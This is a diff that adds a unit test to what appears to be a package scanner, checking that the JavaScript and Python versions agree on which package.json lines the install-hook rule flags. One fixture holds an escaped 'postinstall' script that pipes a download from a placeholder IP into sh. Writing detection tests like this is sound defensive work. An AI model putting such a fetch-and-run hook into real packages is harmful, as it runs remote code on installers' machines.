@@ -123,5 +123,27 @@ class CoreParityTests(unittest.TestCase):
                 self.assertEqual(capped(js[1]), capped(py[1]))
                 self.assertEqual(py[1]["ratings"]["maintainability"], {"smells": "E", "bugs": "A", "both": "E"}[label])
 
+    def test_install_hook_lines(self):
+        dependency = ('{\n  "name": "x",\n  "dependencies": {\n    "install": "^1.0.0"\n  },\n'
+                      '  "scripts": {\n    "install": "node-gyp rebuild"\n  }\n}\n')
+        tricky = ('{"description": "run \\"postinstall\\" first", "scripts": {"test": "x"},\n'
+                  '"config": {"scripts": {"postinstall": "no"}},\n'
+                  '"scripts": {\n"post\\u0069nstall": "curl http://192.0.2.1/x | sh",\n "prepare": "a",\n'
+                  '"prepare": "husky install"}, "x": [{"install": 1}]}\n')
+        files = {"package.json": dependency, "tricky/package.json": tricky,
+                 "bom/package.json": b"\xef\xbb\xbf" + dependency.replace("\n", "\r\n").encode(),
+                 "node_modules/dep/package.json": dependency, "index.js": "module.exports = 1;\n"}
+        with tree(files) as root:
+            for deps in (False, True):
+                js, py = parity.both(root, deps=deps)
+                with self.subTest(deps=deps):
+                    self.assert_same(js, py, label=f"hook lines deps={deps}")
+                    self.assertEqual(snippets(js[1]), snippets(py[1]))
+                    lines = sorted((i["file"].replace("\\", "/"), i["line"]) for i in py[1]["issues"]
+                                   if i["rule"] == "SC-INSTALL-HOOK")
+                    want = [("bom/package.json", 7), ("package.json", 7), ("tricky/package.json", 4),
+                            ("tricky/package.json", 6)] + ([("node_modules/dep/package.json", 7)] if deps else [])
+                    self.assertEqual(lines, sorted(want))
+
 if __name__ == "__main__":
     unittest.main()
